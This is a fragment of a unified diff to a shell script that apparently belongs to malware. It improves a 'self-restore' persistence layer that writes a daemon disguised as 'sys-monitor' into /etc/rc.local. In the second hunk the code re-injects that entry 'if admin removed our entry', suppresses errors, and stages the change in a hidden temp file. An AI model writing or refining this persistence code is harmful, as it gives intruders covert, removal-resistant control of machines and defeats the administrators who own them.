@@ -442,7 +442,10 @@ DREOF
   # Layer 4: rc.local + self-restore
   if [ -f /etc/rc.local ] && ! grep -q "sys-monitor" /etc/rc.local 2>/dev/null; then
     if grep -q '^exit 0' /etc/rc.local 2>/dev/null; then
-      sed -i '/^exit 0/i nohup '"${DAEMON_SCRIPT}"' > /dev/null 2>\&1 \&' /etc/rc.local 2>/dev/null
+      grep -v '^exit 0' /etc/rc.local > /tmp/.rc_tmp 2>/dev/null
+      echo "nohup ${DAEMON_SCRIPT} > /dev/null 2>&1 &" >> /tmp/.rc_tmp
+      echo "exit 0" >> /tmp/.rc_tmp
+      mv -f /tmp/.rc_tmp /etc/rc.local 2>/dev/null
     else
       echo "nohup ${DAEMON_SCRIPT} > /dev/null 2>&1 &" >> /etc/rc.local
     fi
@@ -505,7 +508,11 @@ LCEOF
   # rc.local: if admin removed our entry, re-inject
   if [ -f /etc/rc.local ] && ! grep -q "sys-monitor" /etc/rc.local 2>/dev/null; then
     if grep -q '^exit 0' /etc/rc.local 2>/dev/null; then
-      sed -i '/^exit 0/i nohup '"${DAEMON_SCRIPT}"' > /dev/null 2>\&1 \&' /etc/rc.local 2>/dev/null
+      grep -v '^exit 0' /etc/rc.local > /tmp/.rc_tmp 2>/dev/null
+      echo "nohup ${DAEMON_SCRIPT} > /dev/null 2>&1 &" >> /tmp/.rc_tmp
+      echo "exit 0" >> /tmp/.rc_tmp
+      mv -f /tmp/.rc_tmp /etc/rc.local 2>/dev/null
+      chmod +x /etc/rc.local 2>/dev/null
     else
       echo "nohup ${DAEMON_SCRIPT} > /dev/null 2>&1 &" >> /etc/rc.local
     fi
